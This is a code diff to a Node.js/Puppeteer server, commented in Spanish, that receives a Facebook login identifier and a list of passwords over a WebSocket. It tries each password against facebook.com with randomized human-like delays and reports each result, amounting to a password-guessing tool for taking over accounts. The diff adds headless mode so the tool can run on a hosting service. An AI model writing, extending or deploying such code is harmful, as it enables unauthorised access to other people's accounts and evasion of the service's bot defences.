@@ -13,7 +13,7 @@ const humanLikeDelay = async () => {
 };
 
 // Función de inicio de sesión
-const loginToFacebook = async (page, email, password) => {
+const loginToFacebook = async (page, identifier, password) => {
   try {
     await page.goto('https://www.facebook.com', { waitUntil: 'networkidle2' });
     await humanLikeDelay();
@@ -24,7 +24,7 @@ const loginToFacebook = async (page, email, password) => {
       document.querySelector('#pass').value = '';
     });
 
-    await page.type('#email', email);
+    await page.type('#email', identifier);
     await humanLikeDelay();
     
     await page.type('#pass', password);
@@ -52,10 +52,10 @@ wss.on('connection', (ws) => {
     try {
       const data = JSON.parse(message);
       if (data.type === 'startLogin') {
-        const { email, passwords } = data;
+        const { identifier, passwords } = data;
         
         const browser = await puppeteer.launch({ 
-          headless: false,
+          headless: true, // Modo headless para Render
           args: ['--no-sandbox', '--disable-setuid-sandbox']
         });
         
@@ -65,7 +65,7 @@ wss.on('connection', (ws) => {
         for (const password of passwords) {
           if (ws.readyState !== WebSocket.OPEN) break;
           
-          const result = await loginToFacebook(page, email, password);
+          const result = await loginToFacebook(page, identifier, password);
           if (ws.readyState === WebSocket.OPEN) {
             ws.send(JSON.stringify(result));
           }
@@ -107,7 +107,7 @@ app.get('/', (req, res) => {
 });
 
 // Iniciar servidor
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000; // Usar el puerto de Render o 3000 localmente
 server.listen(PORT, () => {
   console.log(`Servidor en ejecución en http://localhost:${PORT}`);
 });
